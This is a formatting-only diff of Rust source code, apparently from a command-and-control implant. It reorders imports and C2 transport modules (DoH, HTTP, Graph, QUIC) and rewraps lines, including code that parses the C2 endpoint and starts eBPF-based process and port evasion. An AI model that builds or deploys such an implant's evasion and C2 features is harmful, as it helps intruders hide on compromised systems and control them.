@@ -730,9 +730,9 @@ pub mod pe_resolve_macros;
 
 use anyhow::Result;
 use common::{CryptoSession, LockedSecret, Message, Transport};
-use tracing::{error, info, warn};
 use std::sync::Arc;
 use tokio::sync::{Mutex, RwLock};
+use tracing::{error, info, warn};
 
 /// Outbound messages are sent through an mpsc channel to a dedicated writer
 /// task that holds the transport lock.  This prevents the deadlock that occurs
@@ -1102,8 +1102,11 @@ impl Agent {
                         .trim_start_matches("https://")
                         .trim_start_matches("http://");
                     let host_port = without_scheme.split('/').next().unwrap_or("");
-                    let default_port: u16 =
-                        if endpoint_url.starts_with("http://") { 80 } else { 443 };
+                    let default_port: u16 = if endpoint_url.starts_with("http://") {
+                        80
+                    } else {
+                        443
+                    };
                     let port = host_port
                         .rsplit_once(':')
                         .and_then(|(_, p)| p.parse::<u16>().ok())
@@ -1116,8 +1119,7 @@ impl Agent {
                 v
             };
 
-            let patterns: Vec<&str> =
-                pattern_strings.iter().map(String::as_str).collect();
+            let patterns: Vec<&str> = pattern_strings.iter().map(String::as_str).collect();
             let _ebpf_mgr = crate::ebpf_evasion::init(pid, &patterns, &ports);
             // ebpf_mgr is dropped when the scope ends, which would detach
             // programs.  For persistent evasion, the manager must be stored
@@ -1761,9 +1763,9 @@ pub mod obfuscated_sleep;
 /// Startup transport priority is: SSH > DoH > HTTP > TLS fallback.
 #[cfg(feature = "doh-transport")]
 pub mod c2_doh;
-#[cfg(any(feature = "http-transport", feature = "doh-transport"))]
-pub mod c2_http;
 #[cfg(feature = "graph-transport")]
 pub mod c2_graph;
+#[cfg(any(feature = "http-transport", feature = "doh-transport"))]
+pub mod c2_http;
 #[cfg(feature = "quic-transport")]
 pub mod c2_quic;
